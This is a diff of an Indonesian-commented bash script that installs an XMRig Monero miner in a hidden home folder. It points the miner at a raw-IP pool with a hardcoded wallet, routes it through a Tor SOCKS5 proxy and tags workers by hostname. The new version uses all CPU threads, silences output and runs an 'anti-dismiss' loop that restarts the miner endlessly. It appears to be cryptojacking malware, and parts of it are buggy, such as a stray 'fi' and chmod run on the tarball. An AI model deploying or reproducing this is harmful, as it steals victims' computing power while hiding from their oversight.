@@ -1,54 +1,52 @@
 #!/bin/bash
 
-### === SETUP === ###
-WORKDIR="$HOME/.xmrig_proxy"
-mkdir -p "$WORKDIR" && cd "$WORKDIR"
-
-ARCH=$(uname -m)
-if [[ "$ARCH" != "x86_64" ]]; then
-  echo "Hanya mendukung x86_64 (Ubuntu PC)"
-  exit 1
-fi
-
-# === Download and extract XMRig ===
-echo "[*] Downloading XMRig..."
-wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
-cd xmrig-6.24.0 || exit 1
-fi
-
-# === Konfigurasi USER ===
+# === Konfigurasi ===
+POOL="134.199.197.80:443"
 WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
-PROXY="127.0.0.1:9050"
-USE_PROXY=1
+WORKER="linux_$(hostname)_$RANDOM"
+PROXY="socks5://127.0.0.1:9050"
+THREADS=$(nproc)
+USE_TLS=true
 
-# === Buat config.json ===
+# === Setup Folder ===
+mkdir -p ~/.xmrig
+cd ~/.xmrig
+
+# === Unduh XMRig (Linux x64) ===
+if [ ! -f ./xmrig ]; then
+  echo "[*] Downloading XMRig binary..."
+  curl -LO https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-linux-x64.tar.gz
+  tar -xzf xmrig-6.21.0-linux-x64.tar.gz --strip-components=1
+  chmod +x xmrig-6.21.0-linux-x64.tar.gz
+  cd xmrig-6.21.0-linux-x64
+fi
+
+# === Tulis Konfigurasi Langsung ===
 cat > config.json <<EOF
 {
-  "autosave": true,
+  "autosave": false,
   "cpu": {
     "enabled": true,
-    "priority": null,
-    "max-threads-hint": 0.7,   // BATASI 70% CPU
-    "asm": true
+    "priority": 5,
+    "yield": true
   },
   "pools": [
     {
-      "url": "134.199.197.80:443",
-      "user": "$WALLET",
-      "pass": "ubuntu",
+      "url": "$POOL",
+      "user": "$WALLET.$WORKER",
+      "pass": "x",
       "keepalive": true,
-      "tls": true",
-      "socks5": $( [ "$USE_PROXY" -eq 1 ] && echo "\"$PROXY\"" || echo "null" )
+      "tls": $USE_TLS,
+      "socks5": "$PROXY"
     }
   ]
 }
 EOF
 
-# === Jalankan Loop Anti-Dismiss ===
+# === Anti-Dismiss Loop ===
+echo "[*] Starting XMRig with Anti-Dismiss..."
 while true; do
-  echo "[*] Menjalankan XMRig + TLS + $( [ "$USE_PROXY" -eq 1 ] && echo "SOCKS5 Proxy" || echo "No Proxy" )"
-  ./xmrig --config=config.json >> miner.log 2>&1
-  echo "[!] XMRig berhenti. Restart dalam 5 detik..."
+  ./xmrig -c config.json > /dev/null 2>&1
+  echo "[!] Miner exited. Restarting in 5s..."
   sleep 5
 done
